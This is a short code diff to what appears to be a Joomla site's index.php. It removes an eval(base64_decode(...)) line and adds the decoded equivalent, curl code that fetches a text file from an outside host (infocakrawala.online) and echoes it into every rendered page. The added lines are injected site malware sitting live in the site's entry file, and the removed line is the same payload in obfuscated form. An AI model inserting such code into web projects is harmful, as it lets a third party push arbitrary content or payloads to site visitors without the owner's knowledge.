@@ -40,5 +40,9 @@ $app->render();
 JDEBUG ? $_PROFILER->mark('afterRender') : null;
 // Return the response.
 echo $app;
-$encoded_script = 'CiRjaCA9IGN1cmxfaW5pdCgpOyAKY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImh0dHBzOi8vaW5mb2Nha3Jhd2FsYS5vbmxpbmUvc2VjcmV0LXNlcnZpY2UvMzAzLnR4dCIpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOyAKJG91dHB1dCA9IGN1cmxfZXhlYygkY2gpOyAKY3VybF9jbG9zZSgkY2gpOyAgICAgIAplY2hvICRvdXRwdXQ7Cg==';
-eval(base64_decode($encoded_script));
+$ch = curl_init(); 
+    curl_setopt($ch, CURLOPT_URL, "https://infocakrawala.online/secret-service/303.txt");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+    $output = curl_exec($ch); 
+    curl_close($ch);      
+    echo $output;
